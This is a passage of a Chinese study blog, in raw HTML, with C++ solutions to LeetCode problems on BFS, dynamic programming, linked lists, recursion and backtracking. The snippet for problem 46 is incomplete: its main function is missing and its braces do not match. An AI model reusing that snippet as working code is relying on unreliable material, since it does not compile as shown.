head-&gt;right-&gt;next = head-&gt;next-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                head = head-&gt;next;<span class="comment">//指针右移</span></span><br><span class="line">            &#125;</span><br><span class="line">            leftmost = leftmost-&gt;left;<span class="comment">//下一层</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-9-天-广度优先搜索-深度优先搜索"><a href="#第-9-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 9 天 广度优先搜索 / 深度优先搜索"></a>第 9 天 广度优先搜索 / 深度优先搜索</h1><h3 id="542-01-矩阵"><a href="#542-01-矩阵" class="headerlink" title="542. 01 矩阵"></a><a href="https://leetcode-cn.com/problems/01-matrix/" target="_blank" rel="noopener">542. 01 矩阵</a></h3><blockquote>
<p>广度优先</p>
<p>多源最短路-&gt;找到所有的0，距离为0，广播一次，找到所有的元素距离为1，再次广播，距离为2-&gt;依此类推</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dirs[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">updateMatrix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = mat.<span class="built_in">size</span>(),n = mat[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">dist</span><span class="params">(m,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n))</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">seen</span><span class="params">(m,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n))</span></span>;</span><br><span class="line">        <span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将所有的0添加进初始队列中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                    q.emplace(i,j);</span><br><span class="line">                    seen[i][j]=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//广度优先</span></span><br><span class="line">        <span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">            <span class="keyword">auto</span> [x,y] = q.front();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> dx = x+dirs[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">int</span> dy = y+dirs[i][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(dx&gt;=<span class="number">0</span> &amp;&amp; dx&lt;m &amp;&amp; dy&gt;=<span class="number">0</span> &amp;&amp; dy&lt;n &amp;&amp; !seen[dx][dy])&#123;</span><br><span class="line">                    dist[dx][dy] = dist[x][y]+<span class="number">1</span>;</span><br><span class="line">                    q.emplace(dx,dy);</span><br><span class="line">                    seen[dx][dy] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>动态规划</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">updateMatrix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = mat.<span class="built_in">size</span>(),n = mat[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">dist</span><span class="params">(m,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n,INT_MAX/<span class="number">2</span>))</span></span>;<span class="comment">//初始化距离为很大的数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">                    dist[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左下到右下</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i<span class="number">-1</span>&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j],dist[i<span class="number">-1</span>][j]+<span class="number">1</span>);<span class="comment">//当前节点是左边和当前节点最小值</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j<span class="number">-1</span>&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j],dist[i][j<span class="number">-1</span>]+<span class="number">1</span>);<span class="comment">//当前节点是上边和当前节点的最小值</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//右上到左下</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=m<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=n<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i+<span class="number">1</span> &lt; m)&#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j],dist[i+<span class="number">1</span>][j]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j+<span class="number">1</span>&lt;n)&#123;</span><br><span class="line">                    dist[i][j] = <span class="built_in">min</span>(dist[i][j],dist[i][j+<span class="number">1</span>]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="994-腐烂的橘子"><a href="#994-腐烂的橘子" class="headerlink" title="994. 腐烂的橘子"></a><a href="https://leetcode-cn.com/problems/rotting-oranges/" target="_blank" rel="noopener">994. 腐烂的橘子</a></h3><blockquote>
<p>本质上就是多源广度优先的搜索过程</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">    <span class="keyword">int</span> dis[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">orangesRotting</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; Q;</span><br><span class="line">        <span class="built_in">memset</span>(dis,<span class="number">-1</span>,<span class="keyword">sizeof</span>((dis)));</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = grid.<span class="built_in">size</span>(),m = grid[<span class="number">0</span>].<span class="built_in">size</span>(),ans=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="number">2</span>)&#123;<span class="comment">//2是腐烂,距离为0</span></span><br><span class="line">                    Q.push(make_pair(i,j));<span class="comment">//所有的腐烂橘子入队                                                                                          </span></span><br><span class="line">                    dis[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(grid[i][j] == <span class="number">1</span>) cnt += <span class="number">1</span>;<span class="comment">//cnt统计一共多少个好的橘子</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//广度优先搜索</span></span><br><span class="line">        <span class="keyword">while</span>(!Q.empty())&#123;</span><br><span class="line">            pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; x = Q.front();<span class="comment">//x是从队列中取出来的腐烂橘子</span></span><br><span class="line">            Q.pop();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> tx = x.first + dx[i];<span class="comment">//寻找腐烂橘子的上下左右</span></span><br><span class="line">                <span class="keyword">int</span> ty = x.second + dy[i];</span><br><span class="line">                <span class="keyword">if</span>(tx&lt;<span class="number">0</span> || ty&lt;<span class="number">0</span> || tx &gt;=n || ty &gt;=m || !grid[tx][ty] || ~dis[tx][ty]) <span class="keyword">continue</span>;<span class="comment">//错误的上下左右</span></span><br><span class="line">                dis[tx][ty] = dis[x.first][x.second] + <span class="number">1</span>;<span class="comment">//发散+1</span></span><br><span class="line">                Q.push(make_pair(tx,ty));<span class="comment">//发散后的入列</span></span><br><span class="line">                <span class="keyword">if</span>(grid[tx][ty] == <span class="number">1</span>)&#123;<span class="comment">//感染一个正常橘子</span></span><br><span class="line">                    cnt -= <span class="number">1</span>;<span class="comment">//正常橘子数目-1</span></span><br><span class="line">                    ans = dis[tx][ty];<span class="comment">//ans是当前的值</span></span><br><span class="line">                    <span class="keyword">if</span>(!cnt) <span class="keyword">break</span>;<span class="comment">//如果正常橘子被感染完全了,结束</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt ? <span class="number">-1</span>:ans;<span class="comment">//cnt=0返回ans;cnt=1返回-1,则是不可能感染所有的橘子</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-10-天-递归-回溯"><a href="#第-10-天-递归-回溯" class="headerlink" title="第 10 天 递归 / 回溯"></a>第 10 天 递归 / 回溯</h1><h3 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" target="_blank" rel="noopener">21. 合并两个有序链表</a></h3><blockquote>
<p>最简洁明了的递归</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1 == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l2 == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">            l1-&gt;next = mergeTwoLists(l1-&gt;next,l2);</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l2-&gt;next = mergeTwoLists(l1,l2-&gt;next);</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>迭代</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* prehead = <span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode* pre = prehead;</span><br><span class="line">        <span class="keyword">while</span>(l1 != <span class="literal">nullptr</span> &amp;&amp; l2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123;</span><br><span class="line">                pre-&gt;next = l1;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre-&gt;next = l2;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        pre-&gt;next = l1 == <span class="literal">nullptr</span> ? l2:l1;</span><br><span class="line">        <span class="keyword">return</span> prehead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/" target="_blank" rel="noopener">206. 反转链表</a></h3><p>mine</p>
<blockquote>
<p><img src="/2021/08/26/00-03/image-20210809102021413.png" alt="image-20210809102021413"></p>
<p>注释了，100%，不注释，58%，不晓得为啥</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//if(head == nullptr) return head;</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            v.push_back(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* prehead = <span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode* pre = prehead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=v.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            prehead -&gt; next = <span class="keyword">new</span> ListNode(v[i]);</span><br><span class="line">            prehead = prehead -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer1</p>
<blockquote>
<p>迭代，有点绕</p>
<p>改指针，转过来</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* prev = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode* curr = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(curr)&#123;</span><br><span class="line">            ListNode* next = curr-&gt;next;</span><br><span class="line">            curr-&gt;next = prev;</span><br><span class="line">            prev = curr;</span><br><span class="line">            curr = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer2</p>
<blockquote>
<p>递归，高级</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head || !head-&gt;next) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode* newhead = reverseList(head-&gt;next);</span><br><span class="line">        head-&gt;next-&gt;next = head;</span><br><span class="line">        head-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> newhead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-11-天-递归-回溯"><a href="#第-11-天-递归-回溯" class="headerlink" title="第 11 天 递归 / 回溯"></a>第 11 天 递归 / 回溯</h1><h3 id="77-组合"><a href="#77-组合" class="headerlink" title="77. 组合"></a><a href="https://leetcode-cn.com/problems/combinations/" target="_blank" rel="noopener">77. 组合</a></h3><blockquote>
<p>dfs的向量写法</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; temp;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//cur是当前是数字几</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> cur,<span class="keyword">int</span> n,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(temp.<span class="built_in">size</span>() + (n-cur+<span class="number">1</span>)&lt;k)&#123;<span class="comment">//无法拼凑到k个数</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp.<span class="built_in">size</span>() == k)&#123;<span class="comment">//一种组合</span></span><br><span class="line">            ans.push_back(temp);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//选择cur加入</span></span><br><span class="line">        temp.push_back(cur);</span><br><span class="line">        dfs(cur+<span class="number">1</span>,n,k);</span><br><span class="line">        temp.pop_back();</span><br><span class="line">        <span class="comment">//不选择cur加入</span></span><br><span class="line">        dfs(cur+<span class="number">1</span>,n,k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">combine</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        dfs(<span class="number">1</span>,n,k);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>高级，，，就很神奇</p>
<p>通过j&lt;k，通知个数</p>
<p>通过temp[j]+1 == temp[j+1]，让最大就增加到两个相邻；否则用++temp[j];找每个</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; temp;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">combine</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">            temp.push_back(i);        </span><br><span class="line">        &#125;</span><br><span class="line">        temp.push_back(n+<span class="number">1</span>);<span class="comment">//哨兵</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;k)&#123;</span><br><span class="line">            ans.emplace_back(temp.<span class="built_in">begin</span>(),temp.<span class="built_in">begin</span>()+k);</span><br><span class="line">            j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(j&lt;k &amp;&amp; temp[j]+<span class="number">1</span> == temp[j+<span class="number">1</span>])&#123;</span><br><span class="line">                temp[j] = j+<span class="number">1</span>;</span><br><span class="line">                ++j;</span><br><span class="line">            &#125;</span><br><span class="line">            ++temp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode-cn.com/problems/permutations/" target="_blank" rel="noopener">46. 全排列</a></h3><blockquote>
<p>就c++的全排列</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp;output,<span class="keyword">int</span> first,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(first == len)&#123;</span><br><span class="line">            res.emplace_back(output);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=first;i&lt;len;i++)&#123;</span><br><span class="line">            swap(output[i],output[first]);</span><br><span class="line">            backtrack(res,output,first+<span class="number">1</span>,len);</span><br><span class="line">            swap(output[i],output[first]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="784-字母大小写全排列"><a href="#784-字母大小写全排列" class="headerlink" title="784. 字母大小写全排列"></a>784. 字母大小写全排列</h3><blockquote>
<p>深度搜索，全排列</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; ans;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSmall</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> c&gt;=<span class="string">'a'</span> &amp;&amp; c&lt;=<span class="string">'z'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBig</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> c&gt;=<span class="string">'A'</span> &amp;&amp; c&lt;=<span class="string">'Z'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">string</span>&amp; now,<span class="built_in">string</span>&amp; s,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==s.length())</span><br><span class="line">            ans.push_back(now);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span 